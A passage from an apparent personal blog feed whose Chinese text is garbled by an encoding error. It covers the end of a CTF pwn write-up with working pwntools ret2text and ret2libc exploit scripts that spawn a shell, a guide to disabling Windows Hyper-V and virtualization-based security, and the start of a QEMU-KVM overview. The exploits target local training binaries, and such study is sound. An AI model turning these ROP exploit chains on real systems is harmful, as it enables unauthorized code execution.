çš„åç§»ï¼Œä»è€Œè§¦å‘æŸäº› lib å†…éƒ¨çš„æ–­è¨€æˆ–é€ æˆå¼‚å¸¸è®¿é—®ï¼ˆå°¤å…¶æ˜¯å¸¦ SSE/æ ˆå±€éƒ¨å¯¹é½æ•æ„Ÿçš„å®ç°ï¼‰ã€‚</li></ul></blockquote><p>å†™pocï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r = process(<span class="hljs-string">&#x27;./ret&#x27;</span>)<br><br>pop_rdi_ret = <span class="hljs-number">0x400773</span><br>ret_gadget = <span class="hljs-number">0x400501</span><br><br>system_addr = <span class="hljs-number">0x400530</span><br>bin_sh_addr = <span class="hljs-number">0x400794</span><br><br>offset = <span class="hljs-number">0x10</span> + <span class="hljs-number">8</span><br><br>r.recvuntil(<span class="hljs-string">b&quot;Just a simple sign-in!&quot;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * offset+ p64(ret_gadget) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) <br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="libc">libc</h2><p>é¢˜ç›®æç¤ºçš„å¾ˆæ˜æ˜¾ï¼Œret2libcçš„é¢˜ï¼Œçœ‹çœ‹åŸºæœ¬æƒ…å†µ</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011172432843.png" alt="image-20251011172432843"></p><p>æ ˆä¸å¯æ‰§è¡Œï¼Œæ— æ‰€è°“ï¼Œlibcä¹Ÿä¸éœ€è¦æ‰§è¡Œæ ˆä¸­ä»£ç ï¼ŒæŸ¥çœ‹ä¸€ä¸‹</p><p><img src="C:%5CUsers%5C24512%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20251011172932377.png" alt="image-20251011172932377"></p><p>ç®€å•çš„æ ˆæº¢å‡ºï¼ŒæŸ¥çœ‹åå‘ç°å¯ç”¨å‡½æ•°ä¸­æ²¡æœ‰systemï¼Œå­—ç¬¦ä¸²ä¸­ä¹Ÿæ²¡æœ‰&quot;/bin/sh&quot;ï¼Œä½†æ˜¯å¯ä»¥æ‰¾åˆ°putså‡½æ•°ï¼Œé‚£ä¹ˆæ˜¾è€Œæ˜“è§éœ€è¦pltè¡¨æ¥æ³„éœ²åç§»åœ°å€ï¼Œæ‰¾åˆ°systemå‡½æ•°å³å¯ã€‚å…ˆæ‰¾å¡«å……ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251011173630256.png" alt="image-20251011173630256"></p><p>æ¥ä¸‹æ¥æ„é€ æ ˆï¼Œé¦–å…ˆè°ƒç”¨putså‡½æ•°ï¼Œæ³„éœ²putså’Œgetsçš„gotè¡¨åœ°å€ï¼Œéšåå†è®¡ç®—åç§»åç§»ï¼Œæ„é€ å‡ºsystemå‡½æ•°åœ¨gotè¡¨ä¸­çš„åœ°å€ï¼Œæœ€åè°ƒç”¨systemå‡½æ•°è·å–æ§åˆ¶æƒé™ã€‚64ä½ç³»ç»Ÿè°ƒç”¨å‡½æ•°ä¼ å‚é€šè¿‡rdi rsiè¿™æ ·çš„æ–¹å¼ä¼ ï¼Œè¯¦æƒ…ä¸Šç½‘æœã€‚æ‰¾ä¸€ä¸‹rdiå’Œretï¼š<br><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251012211533903.png" alt="image-20251012211533903"></p><p>è¿™æ ·æ ˆå¯¹é½ä¹Ÿæœ‰äº†ï¼Œå°±èƒ½æ“è„šæœ¬äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./pwnlibc&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwnlibc&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-comment"># ä½¿ç”¨ç®€å•ROPï¼ˆå¦‚æœå¯ç”¨ï¼‰</span><br>pop_rdi = <span class="hljs-number">0x400713</span>  <span class="hljs-comment"># ä½¿ç”¨ ROPgadget æŸ¥æ‰¾</span><br>puts_got = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>ret_gadget = <span class="hljs-number">0x4004c9</span><br><br>main_addr = e.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>padding = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x10</span> + <span class="hljs-number">8</span>)<br><br><span class="hljs-comment"># ç¬¬ä¸€æ­¥ï¼šæ³„éœ²putsåœ°å€</span><br>payload1 = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)<br>p.recvuntil(<span class="hljs-string">&quot;No backdoors this time!\n&quot;</span>)<br>p.sendline(payload1)<br><br><span class="hljs-comment"># æ¥æ”¶æ³„éœ²åœ°å€</span><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;Leaked puts: &quot;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br><span class="hljs-comment"># è®¡ç®—libcåŸºåœ°å€</span><br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>log.success(<span class="hljs-string">&quot;libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-string">&quot;system: &quot;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br>log.success(<span class="hljs-string">&quot;/bin/sh: &quot;</span> + <span class="hljs-built_in">hex</span>(binsh_addr))<br><br><span class="hljs-comment"># ç¬¬äºŒæ­¥ï¼šsystem(&quot;/bin/sh&quot;)</span><br>p.recvuntil(<span class="hljs-string">&quot;No backdoors this time!\n&quot;</span>)<br>payload2 = padding + p64(ret_gadget) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr) + p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># æ·»åŠ è¿”å›åœ°å€</span><br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªè„šæœ¬å®é™…è¿è¡Œçš„æ—¶å€™å´å‘ç°libcåº“ä¸å¯¹ï¼Œå°†å…¶æ¢æˆæˆ‘æœ¬åœ°çš„&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;å°±æˆåŠŸäº†ï¼ˆå…·ä½“åŸå› å°šä¸æ¸…æ¥šï¼‰</p><h2 id="easy-syscall">easy_syscall</h2><p>é¢˜ç›®ç»™çš„æç¤ºå¾ˆå……è¶³ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ç¨‹åºä¿¡æ¯ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251015114510414.png" alt="image-20251015114510414"></p><p>64ä½ç¨‹åºï¼Œçœ‹ä¸€ä¸‹ç¨‹åºä»£ç ï¼š<br><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251015114903872.png" alt="image-20251015114903872"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20251015115008822.png" alt="image-20251015115008822"></p><p>æ¼æ´å°±å­˜åœ¨äºå‡½æ•°vulnä¸­ï¼Œä¹Ÿæ˜¯æ ˆæº¢å‡ºï¼Œæ—¢ç„¶é¢˜ç›®æç¤ºäº†é‚£å°±æ‰¾ä¸€ä¸‹ROPgadgetï¼š</p><p>è¿™é“é¢˜æ²¡æœ‰è®¾ç½®raxçš„ROPgadget</p><h2 id="sentences">sentences</h2><h2 id="dinner-chall">dinner-chall</h2><h2 id="Pivot">Pivot</h2><h2 id="uniform">uniform</h2><h1 id="buu">buu</h1>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows11å…³é—­â€œåŸºäºè™šæ‹ŸåŒ–çš„å®‰å…¨æ€§â€</title>
    <link href="/2025/03/27/Windows11%E5%85%B3%E9%97%AD%E2%80%9C%E5%9F%BA%E4%BA%8E%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E2%80%9D/"/>
    <url>/2025/03/27/Windows11%E5%85%B3%E9%97%AD%E2%80%9C%E5%9F%BA%E4%BA%8E%E8%99%9A%E6%8B%9F%E5%8C%96%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E2%80%9D/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä¸€æ¬¡åµŒå¥—è™šæ‹ŸåŒ–çš„å®éªŒé‡Œï¼Œç¬”è€…å¿½ç„¶å‘ç°KVMæŠ¥é”™ã€‚åœ¨æŸ¥è¯¢èµ„æ–™å¹¶ä¸”åœ¨VMWareæ‰“å¼€äº†CPUè™šæ‹ŸåŒ–ä¹‹åæ‚²å‚¬çš„å‘ç°å‡ºç°äº†ä¸€ä¸ªä»æ¥æ²¡æœ‰è§è¿‡çš„é”™è¯¯</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327165416993.png" alt="image-20250327165416993"></p><p>å¦‚æœé€‰æ‹©å¦å°±ç›´æ¥å…³é—­è™šæ‹Ÿæœºäº†ï¼Œé€‰æ‹©æ˜¯å°±ä¼šå‡ºç°è¿™æ ·çš„é”™è¯¯</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327165531474.png" alt="image-20250327165531469"></p><p>æŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯å¾®è½¯çš„ Hyper-V ä¸ VMware Workstation ä¹‹é—´æ˜¯å†²çªçš„ï¼Œéœ€è¦å…³é—­Hyper-Vã€‚æœ¬ä»¥ä¸ºæ˜¯ä¸ªå¾ˆç®€å•çš„äº‹æƒ…ï¼Œç»“æœç¬”è€…çš„ä¸»æœºæ˜¯éå¸¸ç¨€æœ‰çš„ä½“è´¨ï¼ŒæŠ˜è…¾äº†ä¸€ä¸‹åˆã€‚æ•…è®°å½•ä¸€ä¸‹è§£å†³è¿™ä¸ªé—®é¢˜çš„æ—¶å€™90%çš„äººéƒ½æ²¡é‡åˆ°è¿‡çš„æƒ…å†µï¼ˆæ‚²ï¼‰ã€‚</p><p>ä»¥ä¸‹æ˜¯å…³é—­Hyper-Vçš„æ­¥éª¤ï¼Œè¯»è€…å¯ä»¥ä¾æ¬¡å°è¯•ã€‚</p><h1 id="å…³é—­Hyper-V">å…³é—­Hyper-V</h1><p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆæŸ¥çœ‹å‡ ä¸ªå…³é”®çš„è®¾ç½®ã€‚</p><p>é¦–å…ˆæ˜¯ç¡¬ä»¶CPUçš„è™šæ‹ŸåŒ–æ”¯æŒï¼Œå¯ä»¥æŒ‰<code>Ctrl+Shift+Esc</code>æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼ŒéšåæŸ¥çœ‹æ€§èƒ½åˆ†ç»„ï¼ŒæŸ¥çœ‹CPUçš„çŠ¶æ€ã€‚å¦‚å›¾æ‰€ç¤ºCPUè™šæ‹ŸåŒ–å·²å¯ç”¨æ˜¯æ­£å¸¸çš„ï¼Œç¬”è€…ä¸€å¼€å§‹è¿™é‡Œå°±æ˜¯å¯ç”¨çš„ï¼Œæ‰€ä»¥å°±æ²¡æœ‰ç®¡ï¼Œå¦‚æœæœªå¯ç”¨è¯·è‡ªè¡Œæœç´¢èµ„æ–™ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327170744680.png" alt="image-20250327170744680"></p><p>ä¹‹åæ˜¯æ‰“å¼€è®¡ç®—æœº <code>è®¾ç½®-&gt;éšç§å’Œå®‰å…¨æ€§-&gt;Windowså®‰å…¨ä¸­å¿ƒ-&gt;è®¾å¤‡å®‰å…¨æ€§-&gt;å†…æ ¸éš”ç¦»è¯¦ç»†ä¿¡æ¯</code>ï¼Œä¹‹åå°†å†…å­˜å®Œæ•´æ€§å…³é—­ï¼Œå¦‚å›¾æ‰€ç¤ºä¸ºæ­£ç¡®çš„é…ç½®ã€‚ä¹Ÿå°±æ˜¯è¿™ä¸ªä½ç½®ç‹ ç‹ å‘äº†æˆ‘ä¸€æŠŠï¼Œå…ˆè¯´ç»“è®ºï¼Œå†…å­˜å®Œæ•´æ€§ä¸‹é¢çš„æœ¬åœ°æœºæ„ä¿æŠ¤ä¹Ÿéœ€è¦å…³é—­ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327171229700.png" alt="image-20250327171229700"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327200008628.png" alt="image-20250327200008628"></p><h2 id="WindowsåŠŸèƒ½å…³é—­Hyper-V">WindowsåŠŸèƒ½å…³é—­Hyper-V</h2><p>æ‰“å¼€<code>æ§åˆ¶é¢æ¿-&gt;ç¨‹åº-&gt;å¯ç”¨æˆ–å…³é—­WindowsåŠŸèƒ½</code></p><p>å…³é—­hyper-vï¼Œwindowsè™šæ‹Ÿæœºç›‘æ§ç¨‹åºä»¥åŠè™šæ‹Ÿæœºå¹³å°ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327172039367.png" alt="image-20250327172039367"></p><p>å¦‚æœä½ å’Œç¬”è€…ä¸€æ ·æ˜¯å®¶åº­ç‰ˆï¼Œé‚£ä½ ä¹Ÿä¼šçœ‹ä¸åˆ°hyper-våŠŸèƒ½ã€‚ç¬”è€…è¿™é‡Œæ˜¯è‡ªå·±æ‰¾çš„å®‰è£…Hyper-Vçš„è„šæœ¬ï¼Œä½†æ˜¯å…¶å®çœ‹ä¸åˆ°å°±ä¸ç”¨ç®¡äº†ï¼Œè¿™é‡Œä¸ç”¨æ‹…å¿ƒã€‚</p><p>é‡å¯åç”Ÿæ•ˆï¼Œé‡å¯åå¦‚æœè¿˜ä¸èƒ½æ­£å¸¸æ‰“å¼€è™šæ‹Ÿæœºå°±å¾€ä¸‹ç»§ç»­çœ‹ã€‚</p><h2 id="å‘½ä»¤è¡Œå…³é—­">å‘½ä»¤è¡Œå…³é—­</h2><p>1ã€æ‰“å¼€ç®¡ç†å‘˜PowerShellã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327170244070.png" alt="image-20250327170244070"></p><p>2ã€è¾“å…¥bcdedit /set hypervisorlaunchtype offå¹¶å›è½¦ã€‚ï¼ˆè‹¥è¦å¼€å¯åˆ™å°†offæ”¹ä¸ºautoï¼‰</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327170306899.png" alt="image-20250327170306899"></p><p>3ã€æŸ¥çœ‹é€‰é¡¹çŠ¶æ€ã€‚</p><p>å…³é—­åè®°å¾—é‡å¯ï¼Œé‡å¯åå¦‚æœè¿˜ä¸èƒ½æ­£å¸¸æ‰“å¼€è™šæ‹Ÿæœºå°±å¾€ä¸‹ç»§ç»­çœ‹ã€‚</p><h2 id="æœåŠ¡å…³é—­">æœåŠ¡å…³é—­</h2><p>è¿›å…¥æœåŠ¡ï¼Œç¦ç”¨Hyper-Vç›¸å…³çš„æœåŠ¡</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327173029812.png" alt="image-20250327173029812"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327173131049.png" alt="image-20250327173131049"></p><p>åˆ°è¿™é‡Œï¼Œç¬”è€…è¿˜æ˜¯ä¸èƒ½è§£å†³ï¼Œä»”ç»†æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ä¹‹åå‘ç°åŸºäºè™šæ‹ŸåŒ–çš„å®‰å…¨æ€§ä¸€ç›´éƒ½æ²¡æœ‰è¢«å…³é—­ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327173434912.png" alt="image-20250327173434912"></p><p>å¾ˆæ— å¥ˆï¼Œåªèƒ½ç»§ç»­å¯»æ‰¾å…³äºå…³é—­è™šæ‹ŸåŒ–å®‰å…¨çš„èµ„æ–™ã€‚</p><h1 id="å…³é—­â€œåŸºäºè™šæ‹ŸåŒ–çš„å®‰å…¨æ€§â€">å…³é—­â€œåŸºäºè™šæ‹ŸåŒ–çš„å®‰å…¨æ€§â€</h1><h2 id="ç»„ç­–ç•¥å…³é—­ï¼ˆå®¶åº­ç‰ˆæ— æ•ˆï¼‰">ç»„ç­–ç•¥å…³é—­ï¼ˆå®¶åº­ç‰ˆæ— æ•ˆï¼‰</h2><p>ç”±äºç¬”è€…æ˜¯å®¶åº­ç‰ˆï¼Œæ— æ³•ä½¿ç”¨ç»„ç­–ç•¥æ–¹æ³•ï¼ˆå“ªæ€•åœ¨å®¶åº­ç‰ˆå®‰è£…ç»„ç­–ç•¥ä¹Ÿæ˜¯æ— æ•ˆçš„ã€‚ä¸“ä¸šç‰ˆWin11ä¹Ÿæœ‰å¯èƒ½æ— æ•ˆã€‚å®¶åº­ç‰ˆå¼€äº†ç»„ç­–ç•¥ä¹Ÿæ‰¾ä¸åˆ°Device/Credential Guardï¼‰ï¼Œæ‰€ä»¥ç¬”è€…åˆé€‰æ‹©äº†æ³¨å†Œè¡¨æ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æ˜¯å°†è¿‡ç¨‹è®°å½•ã€‚</p><p>1ã€Win+Rè¿è¡Œâ€”â€”è¾“å…¥gpedit.mscå¹¶å›è½¦ æ‰“å¼€ç»„ç­–ç•¥ã€‚</p><p>2ã€æ‰¾åˆ°â€œè®¡ç®—æœºé…ç½®â€”â€”ç®¡ç†æ¨¡æ¿â€”â€”ç³»ç»Ÿâ€”â€”Device Guardâ€å³ä¾§çš„â€œæ‰“å¼€åŸºäºè™šæ‹ŸåŒ–çš„å®‰å…¨â€ç­–ç•¥ï¼Œå°†å…¶ä¿®æ”¹ä¸ºâ€œå·²ç¦ç”¨â€</p><p>3ã€æŸ¥çœ‹é€‰é¡¹çŠ¶æ€ã€‚</p><h2 id="æ³¨å†Œè¡¨å…³é—­">æ³¨å†Œè¡¨å…³é—­</h2><p>1ã€Win+Rè¿è¡Œâ€”â€”è¾“å…¥regeditâ€”â€”å›è½¦ æ‰“å¼€æ³¨å†Œè¡¨ã€‚</p><p>2ã€æ‰¾åˆ°â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuardâ€ç›®å½•å³ä¾§çš„&quot;EnableVirtualizationBasedSecurity&quot;ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ï¼Œå°†å…¶DWORDå€¼ä¿®æ”¹ä¸º0ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327174109879.png" alt="image-20250327174109879"></p><p>é‡å¯ç”Ÿæ•ˆï¼Œé‡å¯åå¦‚æœè¿˜ä¸èƒ½æ­£å¸¸æ‰“å¼€è™šæ‹Ÿæœºå°±å¾€ä¸‹ç»§ç»­çœ‹ã€‚</p><h2 id="PowerShellè„šæœ¬å…³é—­">PowerShellè„šæœ¬å…³é—­</h2><p><strong>æ–¹æ³•å››ï¼šPowerShellè„šæœ¬å…³é—­ï¼ˆéœ€è¦win10ç³»ç»Ÿç‰ˆæœ¬1607ä»¥ä¸Šï¼‰</strong></p><p>1ã€ä¸‹è½½è„šæœ¬æ–‡ä»¶å¹¶è§£å‹ç¼©ã€‚é“¾æ¥ï¼š<a href="https://www.microsoft.com/en-us/download/details.aspx?id=53337">https://www.microsoft.com/en-us/download/details.aspx?id=53337</a></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327195542927.png" alt="image-20250327195542927"></p><p>2ã€ä»¥ç®¡ç†å‘˜æ¨¡å¼æ‰“å¼€å‘½ä»¤è¡Œâ€”â€”è¾“å…¥set-ExecutionPolicy RemoteSignedå¹¶å›è½¦â€”â€”è¾“å…¥Yå¹¶å›è½¦</p><p>3ã€å¤åˆ¶åˆšåˆšè§£å‹ç¼©çš„è„šæœ¬è·¯å¾„ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250327195641601.png" alt="image-20250327195641601"></p><p>4ã€åœ¨ç®¡ç†å‘˜æ¨¡å¼çš„å‘½ä»¤è¡Œä¸­è¾“å…¥cd ä½ çš„è„šæœ¬è·¯å¾„ï¼ˆå‘½ä»¤è¡Œå³é”®ç²˜è´´ï¼‰å¹¶å›è½¦â€”â€”è¾“å…¥dirå¹¶å›è½¦æŸ¥çœ‹å½“å‰ç›®å½•å†…å®¹æ˜¯å¦ä¸ºè„šæœ¬ç›®å½•ã€‚</p><p>5ã€è¾“å…¥.\DG_Readiness_Tool_v3.6.ps1 -Disableï¼ˆæ³¨æ„å‰é¢æœ‰ä¸ªç‚¹ï¼‰å¹¶å›è½¦â€”â€”ç­‰å¾…è¿è¡Œå®Œæˆåé‡å¯ç”µè„‘ï¼ŒæŒ‰ç…§æç¤ºå…³é—­Credential Guardå’ŒDevice Guardï¼ˆæŒ‰ç…§F3-Enter-F3-Enteræ¥è¿›è¡Œè¾“å…¥ï¼‰ã€‚</p><p>æŒ‰é“ç†æ¥è¯´è¿›è¡Œåˆ°è¿™ä¸€æ­¥åŸºæœ¬ä¸Šå°±è§£å†³äº†ï¼Œä½†æ˜¯æˆ‘çš„ç”µè„‘æ­»æ´»å…³ä¸ä¸Šè¿™ä¸ªè™šæ‹ŸåŒ–å®‰å…¨ï¼Œæˆ‘æ‰¾éäº†èµ„æ–™éƒ½æ²¡æœ‰ï¼Œæœ€ååœ¨ä¸€ç¯‡å…³é—­Hyper-Vçš„æ–‡ç« ä¸­å‘ç°è¿˜è¦åœ¨è®¾ç½®é‡Œå°†æœ¬åœ°æœºæ„ä¿æŠ¤å…³é—­ï¼ˆæµªè´¹äº†æˆ‘ä¸€ä¸‹åˆï¼ŒçœŸçš„æ‚²ä¼¤ï¼‰ã€‚</p><p>å¥½äº†ï¼Œåˆ°è¿™é‡Œæœ¬æ–‡å°±å·®ä¸å¤šç»“æŸäº†ã€‚å¦‚æœè¿˜æ²¡æœ‰è§£å†³çš„è¯è¯»è€…ä¸å¦¨è¯•è¯•ä¸‹è½½ä¸€ä¸ªé›·ç”µæ¨¡æ‹Ÿå™¨ï¼Œæ‰“å¼€ä¹‹åé›·ç”µæ¨¡æ‹Ÿå™¨ä¼šæç¤ºä½ çš„ç³»ç»Ÿæ‰“å¼€äº†è™šæ‹ŸåŒ–ï¼Œç‚¹é‡å¯ä¿®å¤å°±è¯•è¯•ï¼ˆçœŸçš„æœ‰ç”¨ä¸”æ–¹ä¾¿ï¼‰ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>è™šæ‹ŸåŒ–</tag>
      
      <tag>è™šæ‹Ÿæœº</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QEMU-KVMè™šæ‹ŸåŒ–æŠ€æœ¯</title>
    <link href="/2025/02/14/QEMU-KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF/"/>
    <url>/2025/02/14/QEMU-KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="è™šæ‹ŸåŒ–æŠ€æœ¯æ¦‚è¿°">è™šæ‹ŸåŒ–æŠ€æœ¯æ¦‚è¿°</h1><p>è™šæ‹ŸåŒ–æ˜¯ä¸€ä¸ªå¹¿ä¹‰çš„æœ¯è¯­ï¼Œåœ¨è®¡ç®—æœºæ–¹é¢é€šå¸¸æ˜¯æŒ‡è®¡ç®—å…ƒä»¶åœ¨è™šæ‹Ÿçš„åŸºç¡€ä¸Šè€Œä¸æ˜¯çœŸå®çš„åŸºç¡€ä¸Šè¿è¡Œï¼ˆ<strong>å¯¹è®¡ç®—æœºç‰©ç†èµ„æºçš„æŠ½è±¡ï¼Œå®ç°èµ„æºçš„æ¨¡æ‹Ÿã€éš”ç¦»å’Œå…±äº«</strong>ï¼‰ã€‚è™šæ‹ŸåŒ–æŠ€æœ¯å¯ä»¥ä½¿å¾—ä¸€å°è®¡ç®—æœºä¸ŠåŸæœ¬åªèƒ½å¤Ÿä¸€å°è®¡ç®—æœºä½¿ç”¨çš„ç¡¬ä»¶è®¾å¤‡èƒ½å¤ŸåŒæ—¶è¿è¡Œå¤šä¸ªé€»è¾‘è®¡ç®—æœºï¼Œæ¯ä¸ªé€»è¾‘è®¡ç®—æœºå¯è¿è¡Œä¸åŒçš„æ“ä½œç³»ç»Ÿï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºéƒ½å¯ä»¥åœ¨ç›¸äº’ç‹¬ç«‹çš„ç©ºé—´å†…è¿è¡Œè€Œäº’ä¸å½±å“ï¼Œä»è€Œæ˜¾è‘—æé«˜è®¡ç®—æœºçš„å·¥ä½œæ•ˆç‡ã€‚</p><p>åœ¨å®é™…çš„ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè™šæ‹ŸåŒ–æŠ€æœ¯ä¸»è¦ç”¨æ¥è§£å†³é«˜æ€§èƒ½çš„ç‰©ç†ç¡¬ä»¶äº§èƒ½è¿‡å‰©å’Œè€çš„ã€æ—§çš„ç¡¬ä»¶äº§èƒ½è¿‡ä½çš„é‡ç»„ã€é‡ç”¨ï¼Œé€æ˜åŒ–åº•å±‚ç‰©ç†ç¡¬ä»¶ï¼Œä»è€Œæœ€å¤§åŒ–çš„åˆ©ç”¨ç‰©ç†ç¡¬ä»¶ï¼Œå¯¹èµ„æºå……åˆ†åˆ©ç”¨ã€‚</p><p>æˆ‘ä»¬å°†æ­¤è™šæ‹Ÿçš„ç¯å¢ƒç§°ä¹‹ä¸ºVMï¼ˆVirtual Machineï¼‰ã€‚å®‰è£…åœ¨è¿™ä¸ªç¯å¢ƒä¹‹ä¸Šçš„ç³»ç»Ÿæˆ‘ä»¬ç§°ä¸º<strong>Guest OS</strong>ï¼ˆå®¢æˆ·ç³»ç»Ÿï¼‰ï¼›è¿è¡ŒVMMçš„æ“ä½œç³»ç»Ÿåˆ™ç§°<strong>Host OS</strong>ï¼ˆæœ¬åœ°æ“ä½œç³»ç»Ÿï¼‰ã€‚</p><h1 id="è™šæ‹ŸåŒ–çš„æœ¬è´¨">è™šæ‹ŸåŒ–çš„æœ¬è´¨</h1><p>åˆ†åŒºï¼šåœ¨æ•´ä¸ªç‰©ç†æœåŠ¡å™¨ä¸Šè¿è¡Œå¤šä¸ªè™šæ‹Ÿæœºï¼›éš”ç¦»ï¼šåœ¨åŒä¸€æœåŠ¡å™¨ä¸Šçš„è™šæ‹Ÿæœºç›¸äº’éš”ç¦»ï¼›å°è£…ï¼šæ•´ä¸ªè™šæ‹Ÿæœºéƒ½ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡ç§»åŠ¨æ–‡ä»¶çš„æ–¹å¼è¿ç§»ï¼›ç›¸å¯¹ç¡¬ä»¶ç‹¬ç«‹ï¼šæ— éœ€ä¿®æ”¹ä»»ä½•æœåŠ¡ä¸Šè¿è¡Œçš„è™šæ‹Ÿæœºï¼›</p><h1 